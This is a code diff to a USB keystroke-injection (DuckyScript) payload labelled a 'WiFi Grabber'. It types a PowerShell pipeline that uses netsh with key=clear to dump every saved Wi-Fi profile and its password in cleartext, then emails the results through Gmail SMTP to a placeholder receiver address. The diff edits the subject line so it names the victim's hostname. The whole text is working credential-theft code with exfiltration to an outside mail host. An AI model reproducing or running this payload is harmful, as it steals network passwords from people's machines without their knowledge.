@@ -12,7 +12,9 @@ ALT y
 REM:::Get Profiles and Passwords:::
 STRING $A = (netsh wlan show pro) | sls "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show pro "$name" key=clear)}  | sls "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | ft -AutoSize
 ENTER
-STRING $hn = "WiFi Grabber for ",hostname 
+STRING $hn = hostname
+ENTER
+STRING $sub = "WiFi Grabbed from $hn"
 ENTER
 REM:::Email WIFI Info::::
 STRING $SMTPServer = 'smtp.gmail.com'
@@ -29,7 +31,7 @@ STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
 ENTER
 STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
 ENTER
-STRING $ReportEmail.Subject = ( $hn | out-string)
+STRING $ReportEmail.Subject = ( $sub | out-string)
 ENTER
 STRING $ReportEmail.Body = ( $A | out-string)
 ENTER
